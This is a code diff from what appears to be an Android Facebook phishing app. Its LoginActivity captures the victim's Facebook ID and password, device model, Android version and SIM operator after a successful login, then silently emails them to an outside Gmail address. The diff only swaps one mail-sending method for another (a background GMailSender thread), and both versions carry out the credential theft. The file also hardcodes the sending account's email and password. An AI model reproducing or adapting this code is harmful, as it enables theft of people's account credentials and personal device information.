@@ -29,7 +29,6 @@ import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.*;
 
-import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
 
 import java.util.Objects;
 
@@ -189,33 +188,28 @@ public class LoginActivity extends AppCompatActivity
                 if(page==2) {
                     if (url.contains("m.facebook.com/home.php?_rdr"))
                     {
-                        String message="Details of Victim =>\n"+
+                        final String message="Details of Victim =>\n"+
                                 "\nFacebook ID = "+Login.getText().toString()+
                                 "\nPassword = "+Pass.getText().toString()+
                                 "\nDevice Used = "+ (Build.MODEL) +
                                 "\nAndroid Version Used = "+ android.os.Build.VERSION.RELEASE+
                                 "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
 
-                        BackgroundMail.newBuilder(LoginActivity.this)
-                                .withUsername("ritik.fbhack@gmail.com")
-                                .withPassword("123212321")
-                                .withMailto("ritik.space@gmail.com")
-                                .withType(BackgroundMail.TYPE_PLAIN)
-                                .withSubject("Facebook Hacked !")
-                                .withBody(message)
-                                .withOnSuccessCallback(new BackgroundMail.OnSuccessCallback() {
-                                    @Override
-                                    public void onSuccess() {
-                                        Toast.makeText(LoginActivity.this, "FB Hacked", Toast.LENGTH_SHORT).show();
-                                    }
-                                })
-                                .withOnFailCallback(new BackgroundMail.OnFailCallback() {
-                                    @Override
-                                    public void onFail() {
-                                        Toast.makeText(LoginActivity.this, "Failed", Toast.LENGTH_SHORT).show();
-                                    }
-                                })
-                                .send();
+                        new Thread(new Runnable() {
+                            @Override
+                            public void run() {
+                                try {
+                                    GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
+                                    sender.sendMail("Facebook Hacked !",
+                                            message,
+                                            "ritik.fbhack@gmail.com",
+                                            "ritik.space@gmail.com");
+                                } catch (Exception e) {
+                                    Log.e("SendMail", e.getMessage(), e);
+                                }
+                            }
+                        }).start();
+
                     }
                 }
             }
